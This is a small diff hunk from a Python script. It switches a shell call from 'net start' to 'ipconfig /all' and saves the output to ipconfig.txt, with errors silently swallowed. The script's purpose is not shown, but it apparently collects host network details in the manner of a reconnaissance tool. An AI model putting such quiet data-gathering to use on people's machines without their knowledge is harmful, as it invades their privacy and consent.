@@ -39,7 +39,7 @@ try:
 except:
     pass
 try:
-    ipconfig=subprocess.check_output("net start",shell=True)
+    ipconfig=subprocess.check_output("ipconfig /all",shell=True)
     with open("ipconfig.txt", 'wb') as file:
         file.write(ipconfig)
 except:
